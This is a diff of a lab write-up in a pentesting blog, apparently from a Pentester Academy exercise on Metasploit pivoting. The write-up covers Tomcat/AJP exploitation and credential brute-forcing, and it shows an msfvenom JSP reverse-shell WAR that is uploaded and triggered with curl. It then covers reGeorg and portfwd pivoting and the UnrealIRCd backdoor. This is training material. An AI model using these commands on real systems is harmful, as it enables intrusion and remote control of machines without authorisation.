@@ -8,13 +8,13 @@ tags: [Pentester Academy,Metasploit]
 # Metasploit Pivoting I
 
 # Steps Taken:
-1. NMAP-ing the nearby network to find out where the first target machine is:
+##### 1. NMAP-ing the nearby network to find out where the first target machine is:
 
 ![](/assets/img/1686.png)
 
 	- As you can see, there are 3 ports opened with 3 services this machine is working on. You can search exploits available on Metasploit for this!
 
-2. Setting up the database to be used on Metasploit:
+##### 2. Setting up the database to be used on Metasploit:
 
 ```bash
 		# service postgresql start
@@ -23,7 +23,7 @@ tags: [Pentester Academy,Metasploit]
 		msf > db_status
 ```
 
-3. Find an exploit to the port 79 in Metasploit:
+##### 3. Find an exploit to the port 79 in Metasploit:
 ![](/assets/img/1687.png)
 
 - Set the options for this exploit:
@@ -34,7 +34,7 @@ tags: [Pentester Academy,Metasploit]
 
 	- Now, we can conclude that the machine doesn't have vulnerabilities on its service on port 79!
 
-4. Check for vulnerabilities with NMAP:
+##### 4. Check for vulnerabilities with NMAP:
 ```bash
 nmap --script=vuln {target}
 ```
@@ -43,7 +43,7 @@ nmap --script=vuln {target}
 
 	- It seems that 8080 is interesting since you just practiced Squid web proxy! Try this out using stuff you learned from Squid!
 
-5. Acquire more information about the web proxy port by doing a GET request with curl:
+##### 5. Acquire more information about the web proxy port by doing a GET request with curl:
 ```bash
 curl -x 192.86.145.3:8080 127.0.0.1
 ```
@@ -52,7 +52,7 @@ curl -x 192.86.145.3:8080 127.0.0.1
 
 		- This shows that there isn't a need for authenticated web request for this proxy.
 
-6. Getting information about the "internal" side of the web proxy:
+##### 6. Getting information about the "internal" side of the web proxy:
 
 		- Modify the /etc/proxychains.conf file.
 		- Do an NMAP scan on the internal side of the web proxy.
@@ -71,7 +71,7 @@ proxychains nmap -sT -sV -Pn -p- 127.0.0.1
 
 	Service: ajp13 , Port 8009 , Version: Apache Jserv(Protocol v1.3)
 
-7. Search exploits for ajp13.
+##### 7. Search exploits for ajp13.
 
 		- It seems that there is no exploit available for this in Metasploit. Look up on exploit-db webpage instead!
 
@@ -86,7 +86,7 @@ proxychains nmap -sT -sV -Pn -p- 127.0.0.1
 
 ...
 
-8. Enumeration on ajp13:
+##### 8. Enumeration on ajp13:
 
 		# nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 <IP>
 
@@ -94,14 +94,14 @@ proxychains nmap -sT -sV -Pn -p- 127.0.0.1
 
 	- Got the same thing with the curl request.
 
-9. Also, it seems like there is a Metasploit available for Ghostcat!
+##### 9. Also, it seems like there is a Metasploit available for Ghostcat!
 
 		msf > use exploit/multi/http/tomcat_mgr_desploy
 		- Still doesn't work!
 
 ![](/assets/img/1696.png)
 
-10. Trying the copy-pasted exploit from exploit-db:
+##### 10. Trying the copy-pasted exploit from exploit-db:
 
 		- This exploits makes it possible for us to navigate through the directories that are possibly in the web server to the proxy.
 
@@ -118,7 +118,7 @@ proxychains nmap -sT -sV -Pn -p- 127.0.0.1
 	- So you can access the files found during the enumeration using this exploit. What happens is that the request will go to port 8009 and will get passed on port 8080!
 	- From the above enumeration, it shows that normal users can't access /manager/html/upload and /manager/html/ directories at all. Find a credential to be used in this!
 
-11. Finding a credential to access /manage/html/*:
+##### 11. Finding a credential to access /manage/html/*:
 
 		- Note that you can modify the request from the exploit with authorization by:
 
@@ -126,7 +126,7 @@ proxychains nmap -sT -sV -Pn -p- 127.0.0.1
 
 	- Notice that by default, user and password are "None". Just modify it once you found a new one.
 
-12. Getting credentials:
+##### 12. Getting credentials:
 
 ![](/assets/img/1686.png)
 
@@ -183,11 +183,11 @@ The **finger** service is used to find information about computer users.
 
 **Another 'finger' service Reference**: https://0xffsec.com/handbook/services/finger/#finger-exploits-search
 
-13. Tried to brute force account with NMAP's script "http-proxy-brute":
+##### 13. Tried to brute force account with NMAP's script "http-proxy-brute":
 
 ![](/assets/img/1705.png)
 
-14. Using Hydra to brute force account passwords:
+##### 14. Using Hydra to brute force account passwords:
 
 **Stuff to try out**:
 
@@ -200,7 +200,7 @@ The **finger** service is used to find information about computer users.
 		-> http-post : doesn't work!
 		# hydra http-post -l root -P /root/wordlists/100-common-passwords.txt -f -V
 
-15. Cracking user "adeniyi"s password:
+##### 15. Cracking user "adeniyi"s password:
 
 		- Use different type of HTTP requests as well as above using: /root/wordlists/100-common-passwords.txt => Doesn't work!
 		- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt => Doesn't work!
@@ -208,7 +208,7 @@ The **finger** service is used to find information about computer users.
 
 **Note: Using Hydra in this won't work!**
 
-16. Using a hint from the walkthrough, use metasploit's "auxiliary/scanner/http/tomcat_mgr_login" to bruteforce the password of "adeniyi" in the Tomcat service!
+##### 16. Using a hint from the walkthrough, use metasploit's "auxiliary/scanner/http/tomcat_mgr_login" to bruteforce the password of "adeniyi" in the Tomcat service!
 
 ![](/assets/img/1709.png)
 
@@ -216,7 +216,7 @@ The **finger** service is used to find information about computer users.
 
 ![](/assets/img/1710.png)
 
-17. Accessing the authorized directory using the exploit from exploit-db(not Metasploit) with the credentials found:
+##### 17. Accessing the authorized directory using the exploit from exploit-db(not Metasploit) with the credentials found:
 
 ![](/assets/img/1711.png)
 
@@ -229,7 +229,7 @@ The **finger** service is used to find information about computer users.
 
 	- Important information found in the get request using the exploit...
 
-18. Checking out other directories at /manager/html/ using the exploit:
+##### 18. Checking out other directories at /manager/html/ using the exploit:
 
 		- /manager/html/upload : accessible only with high privileges (e.g. root)
 		- /manager/status : accessible using user "adeniyi"
@@ -273,13 +273,13 @@ The **finger** service is used to find information about computer users.
 - Beautifying it: Search up "HTML page generator"
 ![](/assets/img/1716.png)
 
-19. Bruteforcing user root's password:
+##### 19. Bruteforcing user root's password:
 
 		TBC... use the same exploit as you used to bruteforce the password of "adeniyi".
 
 		- Doesn't work since we don't have another good wordlist!
 
-20. Using **dirb** to find OTHER directories that are accessible with the credential that we have and maybe enable us to upload a webshell:
+##### 20. Using **dirb** to find OTHER directories that are accessible with the credential that we have and maybe enable us to upload a webshell:
 
 
 		- Find accessible sub-directories under /manager/
@@ -316,7 +316,7 @@ The **finger** service is used to find information about computer users.
 
 	- Analogy: Imagine how it works when astronauts need items from Earth. There would be no way that a single item from Earth will be shipped into the outerspace but only if it is with other items that the astronauts needed so it would be added to other cargo that astronauts needed. In this case, the files needed to run the web server would be the main things the astronauts need and the ".war" file is just the added item. And then when the spaceship launched, the .war file will be sent along with the main items they need.
 
-21. Creating a shellcode with **msfvenom** that let's us have a webshell in the web server:
+##### 21. Creating a shellcode with **msfvenom** that let's us have a webshell in the web server:
 
 		# msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.13.183.3 LPORT=443 -f war > shell.war
 		- "-p" : payload = java/jsp_shell_reverse_tcp which creates a reverse connection when activated on the target machine.
@@ -335,7 +335,7 @@ The **finger** service is used to find information about computer users.
 		2. What extension of the shellcode should be used against this web server?
 		3. 
 
-22. Uploading the shellcode on the web server:
+##### 22. Uploading the shellcode on the web server:
 
 		# curl -v -u adeniyi:anamaria -T shell.war 'http://192.13.183.3:8080/manager/text/deploy?path=/dev-app&update=true'
 		- "-T" flag means upload to the following URI.
@@ -384,7 +384,7 @@ The **finger** service is used to find information about computer users.
 	- It doesn't work.
 
 
-23. Creating a listener using Metasploit's "exploit/multi/handler":
+##### 23. Creating a listener using Metasploit's "exploit/multi/handler":
 
 		- Set up the listener in a way that matches the shellcode's listener port, IP and shellcode.
 
@@ -392,7 +392,7 @@ The **finger** service is used to find information about computer users.
 
 	- This exploit creates a listener but the reverse shell hasn't connected to it yet.
 
-24. ***Activating the shellcode*** in the web server to create a connection to our listener:
+##### 24. ***Activating the shellcode*** in the web server to create a connection to our listener:
 
 		# curl -v -u adeniyi:anamaria http://192.13.183.3:8080/dev-app/
 		- This activates/executes EVERY FILE INSIDE THE '/dev-app' directory!
@@ -404,11 +404,11 @@ The **finger** service is used to find information about computer users.
 ***Proof***:
 ![](/assets/img/1734.png)
 
-25. Interact with the acquired shell!
+##### 25. Interact with the acquired shell!
 
 ![](/assets/img/1735.png)
 
-26. Getting information about the internal network/interface of the web server:
+##### 26. Getting information about the internal network/interface of the web server:
 
 		- Upgrade the session from Shell to Meterpreter.
 		msf > sessions -u 1
@@ -422,7 +422,7 @@ The **finger** service is used to find information about computer users.
 
 		-> 192.199.89.0
 
-26. Setup reGeorg to create a pivot in this compromise machine!
+##### 26. Setup reGeorg to create a pivot in this compromise machine!
 
 		- Upload ~/Desktop/tools/reGeorg/tunnel.jsp on the directory where we uploaded the shellcode which is /manager/text/deploy.
 
@@ -455,7 +455,7 @@ The **finger** service is used to find information about computer users.
 
 		- No other ports seem to be open in this machine!
 
-27. Using Proxychains to acquire information on the services on the machine:
+##### 27. Using Proxychains to acquire information on the services on the machine:
 ![](/assets/img/1744.png)
 
 	- Well setup after using socks4a in Metasploit.
@@ -481,7 +481,7 @@ The **finger** service is used to find information about computer users.
 **Tried post/multi/gather/tomcat_gather exploit on the compromised first target**:
 ![](/assets/img/1750.png)
 
-28. Enumerating the network of the compromised first target machine:
+##### 28. Enumerating the network of the compromised first target machine:
 
 		msf > use post/linux/gather/enum_network
 
@@ -496,7 +496,7 @@ The **finger** service is used to find information about computer users.
 **These are all the stuff you could gather post-exploitation**:
 ![](/assets/img/1751.png)
 
-29. Checking every file found at (28):
+##### 29. Checking every file found at (28):
 
 ```
 Network Config:
@@ -553,7 +553,7 @@ If-up/If-down:
 	- /etc/network:
 
 
-30. Since the services are "tcpwrapped" on normal nmap scan, we can determine its service version using:
+##### 30. Since the services are "tcpwrapped" on normal nmap scan, we can determine its service version using:
 
 		# proxychains nmap -p6667 --script=irc-unrealircd-backdoor.nse {target-ip}
 		- Note that I did it this way AFTER using autoroute + socks4a to create a pivot on this machine. You can also use 'portfwd' in Meterpreter as well!
@@ -573,7 +573,7 @@ If-up/If-down:
 	- This means that from our attacker machine, any port used to create a connection will be redirected to the first compromised machine and then it will pass those request to the internal target machine(2nd). Note that by just using 'autoroute', it doesn't work this way. It may let the outside machine reach the internal machine but doesn't let us impersonate the compromised machine via port forwarding.
 	- Also note that the 'local' part above is in reference to the attacker's machine's network and the 'remote' one is in reference to the subnet of the internal network.
 
-31. Now, from the attacker machine we can NMAP scan the internal machine thinking the one scanning its available ports is the first compromised machine:
+##### 31. Now, from the attacker machine we can NMAP scan the internal machine thinking the one scanning its available ports is the first compromised machine:
 
 		# nmap -p 1234 -sS -sV localhost
 
@@ -581,20 +581,20 @@ If-up/If-down:
 
 	- Now, we can see that the version of the 'irc' used is "UnrealIRCd".
 
-32. Find exploits for this specific version of irc:
+##### 32. Find exploits for this specific version of irc:
 
 ![](/assets/img/1759.png)
 
 	- You can also use 'searchsploit' to find more!
 
-33. Figuring out whether this version of irc is actually vulnerable to this backdoor RCE:
+##### 33. Figuring out whether this version of irc is actually vulnerable to this backdoor RCE:
 
 		# nmap -p1234 -sS -sV --script=irc-unrealircd-backdoor.nse localhost
 		- He probably just searched up the script on NMAP related to the irc version. I guess this is one way to figure out if a version is vulnerable to the exploit.
 
 ![](/assets/img/1760.png)
 
-34. Executing the exploit:
+##### 34. Executing the exploit:
 ![](/assets/img/1761.png)
 
 	- Notice that the exploit doesn't work. Why?
@@ -607,7 +607,7 @@ If-up/If-down:
 
 **Note**: The reason it doesn't work when using reverse connection is that you are trying to make the port 6697, assigned to an IRC service to connect to you instead of just directly connecting to the port service the IRC service! Lastly, an IRC service expects users to connect to it instead of the other way around so using a reverse payload will not work.
 
-35. Finding the flag on the second target machine:
+##### 35. Finding the flag on the second target machine:
 
 		# find / -iname *flag*
 
@@ -615,13 +615,13 @@ If-up/If-down:
 
 ![](/assets/img/1764.png)
 
-**Current thought process**:
+**Thought process**:
 
-1. Get privileged access on the proxy server -> don't need to since the 'deploy' directory is accessible from normal users. [/]
-2. Access /manager/html/upload -> this directory is not accessible with the user we have so we use an alternative which is /manager/text/deploy which also lets us upload a file into the web server. [/]
-3. Upload a webshell -> got a much better reverse shell instead! [/]
-4. Figure out the subnet of the internal network -> [/]
-5. Create a pivot on the compromised machine using reGeorg -> The pivot is created using autoroute + portfwd[/]
-6. Scan the internal network machine using Nmap+proxychains -> scanned even without using proxychains but through the use of 'portfwd'[/]
-7. Find services to exploit in it -> IRC is available on the internal machine second target[/]
-8. Acquire the flag [/]
+##### 1. Get privileged access on the proxy server -> don't need to since the 'deploy' directory is accessible from normal users. [/]
+##### 2. Access /manager/html/upload -> this directory is not accessible with the user we have so we use an alternative which is /manager/text/deploy which also lets us upload a file into the web server. [/]
+##### 3. Upload a webshell -> got a much better reverse shell instead! [/]
+##### 4. Figure out the subnet of the internal network -> [/]
+##### 5. Create a pivot on the compromised machine using reGeorg -> The pivot is created using autoroute + portfwd[/]
+##### 6. Scan the internal network machine using Nmap+proxychains -> scanned even without using proxychains but through the use of 'portfwd'[/]
+##### 7. Find services to exploit in it -> IRC is available on the internal machine second target[/]
+##### 8. Acquire the flag [/]
